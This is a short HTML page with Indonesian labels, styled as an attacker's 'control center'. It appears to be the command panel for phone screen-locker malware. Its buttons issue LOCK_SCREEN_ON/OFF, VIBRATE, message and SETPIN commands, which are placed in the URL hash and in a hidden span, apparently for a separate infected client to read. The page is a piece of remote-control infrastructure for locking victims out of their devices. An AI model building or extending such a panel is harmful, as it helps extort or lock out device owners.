<!DOCTYPE html>
<html>
<head>
<title>⚫ PANEL ORION ⚫</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
h1{text-align:center;border:1px solid #0f0;}
.card{border:1px solid #0f0;padding:10px;margin:10px 0;}
.btn{background:#f00;color:white;padding:10px;border:none;margin:5px;cursor:pointer;font-size:16px;}
.btn-green{background:#0a0;}
input{padding:10px; width:150px; background:#222; border:1px solid #0f0; color:#fff;}
</style>
</head>
<body>

<h1>=== CONTROL CENTER ===</h1>

<h2>⚡ KIRIM PERINTAH:</h2>
<button class="btn" onclick="kirim('LOCK_SCREEN_ON')">🔴 LOCK ON</button>
<button class="btn btn-green" onclick="kirim('LOCK_SCREEN_OFF')">🟢 LOCK OFF</button>
<br><br>
<button class="btn" onclick="kirim('VIBRATE')">📳 GETAR</button>
<br><br>

<input type="text" id="pesan" placeholder="Tulis pesan...">
<button class="btn" onclick="kirimPesan()">💬 KIRIM PESAN</button>
<br><br>

<input type="text" id="pinbaru" placeholder="PIN BARU (4 ANGKA)" maxlength="4">
<button class="btn" style="background:blue" onclick="gantiPin()">🔑 GANTI PIN</button>

<script>
function kirim(perintah){
    // Kita tulis perintah di URL bar
    window.location.href = "panel.html#" + perintah;
    alert("TERKIRIM: " + perintah);
}
function kirimPesan(){
    let t = document.getElementById('pesan').value;
    kirim("MSG:"+t);
}
function gantiPin(){
    let p = document.getElementById('pinbaru').value;
    if(p.length==4) kirim("SETPIN:"+p+"|");
    else alert("PIN 4 ANGKA!");
}
</script>

<!-- AREA SIMPAN PERINTAH -->
<div id="output" style="display:none">
    <span id="cmdText"></span>
</div>

<script>
    // Tampilkan perintah di kode sumber
    let cmd = window.location.hash.replace("#", "");
    document.getElementById("cmdText").innerText = cmd;
</script>

</body>
</html>
